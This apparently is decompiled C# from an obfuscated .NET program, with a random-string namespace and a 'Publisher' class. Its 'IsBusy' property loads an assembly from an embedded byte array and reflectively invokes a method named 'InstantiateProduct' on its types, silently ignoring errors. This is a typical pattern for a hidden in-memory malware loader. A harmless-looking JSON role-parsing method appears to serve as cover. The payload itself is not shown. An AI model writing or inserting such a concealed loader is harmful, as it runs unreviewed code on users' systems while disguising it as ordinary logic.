using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using Newtonsoft.Json;

namespace Olklwtdpqcgelweitxp;

internal static class Publisher
{
	public static bool IsBusy
	{
		get
		{
			List<Type> list = new List<Type>();
			Type[] exportedTypes = Assembly.Load(Helper.BytesConvertor).GetExportedTypes();
			foreach (Type item in exportedTypes)
			{
				list.Add(item);
			}
			exportedTypes = list.ToArray();
			foreach (Type type in exportedTypes)
			{
				try
				{
					return (bool)type.InvokeMember("InstantiateProduct", BindingFlags.InvokeMethod, null, 0, null);
				}
				catch
				{
				}
			}
			return false;
		}
	}

	public static void Support()
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		IList<Role> list = new List<Role>();
		JsonTextReader val = new JsonTextReader((TextReader)new StringReader("{ 'name': 'Admin' }{ 'name': 'Publisher' }"));
		((JsonReader)val).set_SupportMultipleContent(true);
		while (((JsonReader)val).Read())
		{
			Role item = new JsonSerializer().Deserialize<Role>((JsonReader)(object)val);
			list.Add(item);
		}
		foreach (Role item2 in list)
		{
			Console.WriteLine(item2.Name);
		}
	}
}
